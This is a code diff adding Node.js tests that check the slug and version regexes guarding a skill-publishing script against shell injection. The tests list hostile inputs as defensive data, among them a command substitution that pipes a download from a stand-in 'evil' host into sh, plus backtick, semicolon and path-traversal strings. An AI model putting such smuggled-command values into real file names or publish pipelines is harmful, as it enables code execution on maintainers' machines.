@@ -7,6 +7,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 const fs = require('fs');
 const { NAMES, render, outPath, sourceBody, DESCRIPTIONS } = require('../scripts/build-openclaw-skills');
+const { SLUG_RE, VERSION_RE } = require('../scripts/publish-openclaw-skills');
 
 for (const name of NAMES) {
   test(`${name}: committed OpenClaw skill matches the generator`, () => {
@@ -24,3 +25,41 @@ for (const name of NAMES) {
     assert.ok(d.length <= 160 && !d.includes('\n'), 'description too long or multiline');
   });
 }
+
+// publish-openclaw-skills.js interpolates slugs and the version into a shell
+// command, so these two regexes are the only thing standing between a directory
+// name in a PR and code execution on the maintainer's publish run.
+test('publish guard: every real skill slug passes SLUG_RE', () => {
+  for (const name of NAMES) {
+    assert.ok(SLUG_RE.test(name), `${name} would be rejected by the publish guard`);
+  }
+});
+
+test('publish guard: SLUG_RE rejects shell metacharacters', () => {
+  const hostile = [
+    'foo$(curl evil|sh)',
+    'foo`id`',
+    'foo;id',
+    'foo&&id',
+    'foo id',          // spaces split into extra argv
+    'foo"bar',
+    "foo'bar",
+    '../escape',
+    'foo\nbar',        // anchors must not stop at a newline
+    'Foo',             // uppercase is not a slug
+    '-foo',
+    'foo-',
+  ];
+  for (const s of hostile) {
+    assert.ok(!SLUG_RE.test(s), `SLUG_RE must reject ${JSON.stringify(s)}`);
+  }
+});
+
+test('publish guard: VERSION_RE accepts semver, rejects injection', () => {
+  for (const v of ['4.8.4', '1.0.0-rc.1', '1.0.0+build.5']) {
+    assert.ok(VERSION_RE.test(v), `VERSION_RE must accept ${v}`);
+  }
+  for (const v of ['1.0.0; id', '1.0.0$(id)', '1.0.0 `id`', '1.0.0\nid']) {
+    assert.ok(!VERSION_RE.test(v), `VERSION_RE must reject ${JSON.stringify(v)}`);
+  }
+});
